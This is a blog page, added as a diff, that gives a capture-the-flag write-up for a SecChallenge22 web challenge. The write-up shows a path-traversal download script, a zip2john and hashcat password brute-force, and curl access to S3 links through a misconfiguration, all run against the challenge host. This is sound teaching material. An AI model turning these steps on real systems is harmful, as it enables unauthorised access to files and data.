@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Instant Development Company | m4rcix</title>
+<meta name="generator" content="Jekyll v3.9.1" />
+<meta property="og:title" content="Instant Development Company" />
+<meta name="author" content="m4rcix" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Red herring city" />
+<meta property="og:description" content="Red herring city" />
+<link rel="canonical" href="https://m4rcix.github.io/sc22/web/instant" />
+<meta property="og:url" content="https://m4rcix.github.io/sc22/web/instant" />
+<meta property="og:site_name" content="m4rcix" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-03-16T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Instant Development Company" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"m4rcix"},"dateModified":"2022-03-16T00:00:00+00:00","datePublished":"2022-03-16T00:00:00+00:00","description":"Red herring city","headline":"Instant Development Company","mainEntityOfPage":{"@type":"WebPage","@id":"https://m4rcix.github.io/sc22/web/instant"},"url":"https://m4rcix.github.io/sc22/web/instant"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://m4rcix.github.io/feed.xml" title="m4rcix" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">m4rcix<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/MarcixWasTaken"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://www.twitch.tv/marcix"><i class="fab fa-twitch"></i></a>
+        
+        
+        
+        <a class="color-red-hover" href="https://www.youtube.com/channel/UChaUSPtWwNkUpzrjUW7H0PA"><i class="fab fa-youtube"></i></a>
+        
+        
+        
+        <a class="color-yellow-hover" href="https://github.com/m4rcix"><i class="fab fa-github-square"></i></a>
+        
+        
+        
+        <a class="color-blue-hover" href="https://www.linkedin.com/in/marton-bak-574a59201/"><i class="fab fa-linkedin"></i></a>
+        
+        
+        
+        <a class="color-green-hover" href="https://app.hackthebox.eu/profile/367067"><i class="fa fa-cube"></i></a>
+        
+        
+        
+        <a class="color-blue-hover" href="https://discord.com/invite/wGHG5Aj"><i class="fab fa-discord"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+<div class="post">
+  <h1 class="post-title">Instant Development Company</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/web/">web</a>
+      
+      <a class="tag" href="/tag/secchallenge22/">secchallenge22</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 16 Mar 2022</div>
+  
+  <noscript>
+    <div class="post-description">Red herring city</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <h2 id="description">Description</h2>
+
+<p>Your uncle got scammed but he’s too embarrassed to tell you how much he had lost. Can you find out?</p>
+
+<p><a href="https://instant-development-company.secchallenge.crysys.hu">https://instant-development-company.secchallenge.crysys.hu</a></p>
+
+<ul>
+  <li>Author: Andrix</li>
+</ul>
+
+<h2 id="solution">Solution</h2>
+
+<p>Opening up the site we aren’t presented with too many options, so we head to the <code class="language-plaintext highlighter-rouge">/review</code> endpoint through the link on the main page. Its vulnerable to XSS but other than that, I could not find anything interesting.
+I decided to go back to the roots, and started running <code class="language-plaintext highlighter-rouge">dirbuster</code> on the site, and it quickly found a hidden endpoint: <code class="language-plaintext highlighter-rouge">/debug</code>.</p>
+
+<p>On there we have bunch of options, but downloading source seems like a good place to start.
+After acquiring the source files we are presented with:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>announce.html
+base.html
+debug.html
+index.html
+reviews.html
+</code></pre></div></div>
+
+<p>Reading through the files, we can see some comments inside the <code class="language-plaintext highlighter-rouge">debug.html</code> file, which indicate, that a <code class="language-plaintext highlighter-rouge">backup.zip</code> file with an easy to break password is accessible from the webroot. We can download the mentioned file using a small python script:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"https://instant-development-company.secchallenge.crysys.hu/download/templates"</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'template'</span><span class="p">:</span> <span class="s">'../backup.zip'</span><span class="p">},</span> <span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'backup.zip'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+	<span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>From here we are required to crack the password. To do this, we first extract the password hash, then we can use hashcat to crack it.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip2john backup.zip <span class="o">&gt;</span> backup.hash
+<span class="c"># remove unnecessary content from backup.hash</span>
+<span class="c"># or else hashcat will throw errors</span>
+
+<span class="c"># -a brute -m hashtype = PKZIP (Compressed Multi-File) file format</span>
+hashcat <span class="nt">-a</span> 3 <span class="nt">-m</span> 17220 backup.hash ?d?d?d?d?d?d?d?d?d?d
+</code></pre></div></div>
+
+<p>Once hashcat crunched all the possibilities, we can unzip the previously extracted zipfile. It contains two files:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>README.txt
+contracts.txt
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">README</code> contains some sort of clue/meme, but the <code class="language-plaintext highlighter-rouge">contracts.txt</code> is the file we are looking for. It contains a bunch of, already expired S3 links.</p>
+
+<p>At this point I got lucky, and solved the challenge by accident using python (I realized if I use curl, the links remain accessible, and I can read the contents, probably due to some AWS missconfiguration):</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"contracts.txt"</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+	<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">.</span><span class="n">readlines</span><span class="p">():</span>
+		<span class="n">r</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s">'curl </span><span class="si">{</span><span class="n">line</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>After the solve, I contacted Andrix, who gave the explaination:
+If you forgo the parameters given to the http request (the stuff after the <code class="language-plaintext highlighter-rouge">?</code> in the URL) you can abuse the AWS S3 missconfiguration.</p>
+
+<p>The acquired flag is:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd22{HIDDEN}
+</code></pre></div></div>
+
+<p><a href="/sc22">← Back to SecChallenge22</a></p>
+
+</div>
+
+
+
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/ctf/" class="set-1">CTF</a> <a href="/tag/crypto/" class="set-1">crypto</a> <a href="/tag/crysys/" class="set-1">crysys</a> <a href="/tag/dnspy/" class="set-1">dnSpy</a> <a href="/tag/hardware/" class="set-3">hardware</a> <a href="/tag/misc/" class="set-3">misc</a> <a href="/tag/pwn/" class="set-2">pwn</a> <a href="/tag/reverse/" class="set-2">reverse</a> <a href="/tag/secchallenge/" class="set-5">secchallenge</a> <a href="/tag/secchallenge22/" class="set-5">secchallenge22</a> <a href="/tag/web/" class="set-4">web</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'Red herring city';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
